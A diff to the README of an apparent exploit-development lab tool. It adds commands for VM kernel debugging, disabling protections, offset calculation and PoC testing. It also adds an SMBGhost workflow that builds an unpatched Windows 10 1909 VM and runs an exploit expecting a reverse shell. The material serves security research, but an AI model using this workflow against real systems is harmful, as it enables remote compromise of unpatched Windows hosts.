@@ -47,8 +47,13 @@ pip3 install impacket
 | `tools --vm N` | Install exploit dev tools |
 | `ad --vm N --domain D` | Promote to Domain Controller |
 | `update --vm N --msu F` | Apply a Windows CU to running VM |
+| `debug --vm N --mode M` | Start VM with kernel debug (gdb/serial/both) |
+| `feature --vm N --enable F` | Toggle Windows features (firewall, SMBv3, KD, ASLR...) |
+| `offsets --vm N --exploit E` | Calculate exploit offsets from target binaries |
+| `exploit-test --vm N --poc P` | Run PoC with PCAP, crash dump, and shell monitoring |
 | `snapshot N create\|restore\|list S` | QCOW2 snapshot management |
-| `start\|stop\|destroy N` | VM lifecycle |
+| `start N [--debug M] [--cpus N]` | Start VM with optional debug and CPU config |
+| `stop\|destroy N` | VM lifecycle |
 | `exec N cmd` | Run command via wmiexec (PTH) |
 | `extract N remote local` | Download file from VM via SMB |
 | `screenshot N` | QMP screendump |
@@ -64,7 +69,36 @@ Any Windows build indexed by UUP dump:
 | `20348.x` | Windows Server 2022 |
 | `17763.x` | Windows Server 2019 |
 | `22631.x` | Windows 11 23H2 |
-| `19041-19045.x` | Windows 10 |
+| `19041-19045.x` | Windows 10 (2004-22H2) |
+| `18363.x` | Windows 10 1909 |
+| `18362.x` | Windows 10 1903 |
+
+## Exploit dev workflow example (SMBGhost)
+
+```bash
+# 1. Create a vulnerable Win10 1909 VM (build 18363.719 = last pre-patch)
+xdev-lab create --build 18363.719 --name win10-smb --tools exploit-dev
+
+# 2. Configure for exploit testing
+xdev-lab feature --vm win10-smb --enable SingleCPU    # 1 logical CPU for reliability
+xdev-lab feature --vm win10-smb --list                 # verify SMBv3 compression is on
+
+# 3. Calculate offsets for this build
+xdev-lab offsets --vm win10-smb --exploit smbghost
+
+# 4. Start with kernel debug for crash analysis
+xdev-lab start win10-smb --debug gdb --cpus 1
+
+# 5. Run the exploit with monitoring
+xdev-lab exploit-test --vm win10-smb \
+    --poc ./SMBleedingGhost.py \
+    --args "10.10.10.30 10.10.10.1 4444" \
+    --expect shell --listen 4444
+
+# 6. Extract binaries for offline RE
+xdev-lab extract win10-smb Windows/System32/drivers/srvnet.sys ./srvnet.sys
+xdev-lab extract win10-smb Windows/System32/ntoskrnl.exe ./ntoskrnl.exe
+```
 
 ## How it works
 
